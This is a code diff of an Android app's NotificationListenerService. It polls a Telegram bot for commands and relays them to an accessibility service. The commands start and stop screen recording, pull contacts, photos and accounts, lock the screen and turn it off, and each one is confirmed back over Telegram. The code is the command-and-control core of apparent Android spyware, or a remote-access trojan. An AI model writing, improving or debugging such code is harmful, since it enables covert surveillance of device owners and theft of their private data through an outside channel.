@@ -4,6 +4,8 @@ import android.app.*;
 import android.content.*;
 import android.os.*;
 import android.service.notification.*;
+import android.Manifest;
+import android.content.pm.PackageManager;
 import androidx.core.app.NotificationCompat;
 import okhttp3.*;
 import org.json.JSONArray;
@@ -68,43 +70,41 @@ public class NotificationService extends NotificationListenerService {
                                 String text = message.getString("text");
                                 long chatId = message.getJSONObject("chat").getLong("id");
                                 
+                                // تأكيد وصول الأمر
+                                sendToTelegram("📩 تم استلام الأمر: " + text, String.valueOf(chatId));
+                                
                                 if (text.equals("/start_record")) {
-                                    Intent intent = new Intent("START_RECORDING");
-                                    sendBroadcast(intent);
-                                    sendToTelegram("🎥 بدأ تسجيل الشاشة", String.valueOf(chatId));
+                                    sendCommandToRecordingService("START_RECORDING");
+                                    sendToTelegram("🎥 أمر بدء التسجيل مرسل", String.valueOf(chatId));
                                 }
                                 else if (text.equals("/stop_record")) {
-                                    Intent intent = new Intent("STOP_RECORDING");
-                                    sendBroadcast(intent);
-                                    sendToTelegram("⏹ تم إيقاف التسجيل", String.valueOf(chatId));
+                                    sendCommandToRecordingService("STOP_RECORDING");
+                                    sendToTelegram("⏹ أمر إيقاف التسجيل مرسل", String.valueOf(chatId));
                                 }
                                 else if (text.equals("/contacts")) {
-                                    Intent intent = new Intent("GET_CONTACTS");
-                                    sendBroadcast(intent);
-                                    sendToTelegram("📇 جاري سحب جهات الاتصال", String.valueOf(chatId));
+                                    sendCommandToRecordingService("GET_CONTACTS");
+                                    sendToTelegram("📇 أمر سحب جهات الاتصال مرسل", String.valueOf(chatId));
                                 }
                                 else if (text.equals("/photos")) {
-                                    Intent intent = new Intent("GET_PHOTOS");
-                                    sendBroadcast(intent);
-                                    sendToTelegram("🖼 جاري سحب الصور", String.valueOf(chatId));
+                                    sendCommandToRecordingService("GET_PHOTOS");
+                                    sendToTelegram("🖼 أمر سحب الصور مرسل", String.valueOf(chatId));
                                 }
                                 else if (text.equals("/lock")) {
-                                    Intent intent = new Intent("LOCK_SCREEN");
-                                    sendBroadcast(intent);
-                                    sendToTelegram("🔒 جاري قفل الشاشة", String.valueOf(chatId));
+                                    sendCommandToRecordingService("LOCK_SCREEN");
+                                    sendToTelegram("🔒 أمر قفل الشاشة مرسل", String.valueOf(chatId));
                                 }
                                 else if (text.equals("/accounts")) {
-                                    Intent intent = new Intent("GET_ACCOUNTS");
-                                    sendBroadcast(intent);
-                                    sendToTelegram("👤 جاري سحب الحسابات", String.valueOf(chatId));
+                                    sendCommandToRecordingService("GET_ACCOUNTS");
+                                    sendToTelegram("👤 أمر سحب الحسابات مرسل", String.valueOf(chatId));
                                 }
                                 else if (text.equals("/screen_off")) {
-                                    Intent intent = new Intent("SCREEN_OFF");
-                                    sendBroadcast(intent);
-                                    sendToTelegram("📱 جاري إطفاء الشاشة", String.valueOf(chatId));
+                                    sendCommandToRecordingService("SCREEN_OFF");
+                                    sendToTelegram("📱 أمر إطفاء الشاشة مرسل", String.valueOf(chatId));
                                 }
                                 else if (text.equals("/status")) {
-                                    sendToTelegram("✅ النظام يعمل - " + new java.util.Date().toString(), String.valueOf(chatId));
+                                    String status = "✅ النظام يعمل\n";
+                                    status += "⏰ الوقت: " + new java.util.Date().toString();
+                                    sendToTelegram(status, String.valueOf(chatId));
                                 }
                             }
                         }
@@ -116,8 +116,20 @@ public class NotificationService extends NotificationListenerService {
             }
             
             @Override 
-            public void onFailure(Call c, IOException e) {}
+            public void onFailure(Call c, IOException e) {
+                e.printStackTrace();
+            }
         });
+    }
+
+    private void sendCommandToRecordingService(String command) {
+        try {
+            Intent intent = new Intent(this, RecordingAccessibilityService.class);
+            intent.setAction(command);
+            startService(intent);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
     @Override
